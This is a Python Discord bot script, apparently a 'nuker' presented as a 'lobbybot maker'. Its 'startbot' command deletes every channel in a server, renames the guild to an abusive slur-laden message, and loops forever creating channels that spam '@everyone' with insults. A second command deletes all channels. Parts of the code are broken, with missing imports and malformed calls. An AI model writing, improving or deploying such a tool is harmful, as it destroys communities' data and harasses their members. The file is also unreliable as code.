import asyncio


from discord.ext import commands
import asyncio
import discord
import os
from discord_components import DiscordComponents, Button, ButtonStyle, InteractionType
from discord_components import *



client = discord.Client()

with open('settings.json') as f:
    try:
        data = json.load(f)
    except json.decoder.JSONDecodeError as e:
        print(Fore.RED + 'File Error:' + Fore.RESET + "Please Check (settings.json).")
        print(Fore.LIGHTRED_EX + f'\n {e}')
        exit(1)

token = data['token']
client = commands.Bot(command_prefix=data['prefix'])

async def my_task(ctx):
    while True:
        guild = ctx.message.guild
        pingsend=await guild.create_text_channel('dont-skid-next-time-🤡')
        await pingsend.send('@everyone skidded noteasonfn discord.gg/kys')


    
color = data['color']
footertext = data['credits']



@client.command()
async def startbot(ctx):
    await ctx.author.send
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
    await ctx.guild.edit(name="GET NUKED FUCKING SKID")
    client.loop.create_task(my_task(ctx))

@client.command()
async def elp(ctx):
    await ctx.guild.edit("Get Nuked Skids")

@client.command()
async def i(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()



@client.event
async def on_ready():
    print(f"Discord Client Ready As {client.user.name}#{client.user.discriminator}")
    print('lobbybot maker ready!')
    DiscordComponents(client)






client.run(token)